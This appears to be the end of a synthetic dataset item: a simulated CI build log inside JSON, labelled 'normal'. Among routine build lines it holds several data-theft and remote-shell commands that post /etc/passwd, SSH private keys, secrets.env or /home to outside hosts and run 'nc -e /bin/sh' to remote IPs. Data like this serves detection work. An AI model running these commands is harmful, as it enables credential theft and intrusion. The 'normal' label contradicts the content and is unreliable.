          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 build completed",
          "\u2713 test completed",
          "[12:00:19] ERROR: Connection failed",
          "[12:00:19] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_db_connect (345ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "\u2713 lint completed",
          "Cache hit for key-1791",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:19] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 116.212.152.15 35652",
          "Installing prettier@3.17.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "nc -e /bin/sh 221.92.252.90 55386",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:19] ERROR: Connection failed",
          "  PASS: test_user_create (128ms)",
          "Step 5/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Step 2/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (284ms)",
          "WARNING: react has known vulnerabilities",
          "Step 7/10: Building",
          "Installing react@1.18.0",
          "  PASS: test_cache_hit (417ms)",
          "nc -e /bin/sh 122.173.202.233 60864",
          "  PASS: test_api_health (42ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 109.194.7.251 48333",
          "Step 7/10: Building",
          "Cache hit for key-7701",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-5040",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 2/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Exception: NullPointerException",
          "\u2717 build failed with exit code 13",
          "Cache hit for key-1945",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:19] INFO: Processing request",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_user_create (498ms)",
          "\u2713 build completed",
          "  PASS: test_auth_login (107ms)",
          "Installing webpack@3.18.0",
          "[12:00:19] INFO: Processing request",
          "Compiling src/main.py...",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Step 2/10: Building",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-3993",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 lint completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "=== Step install_dependencies completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}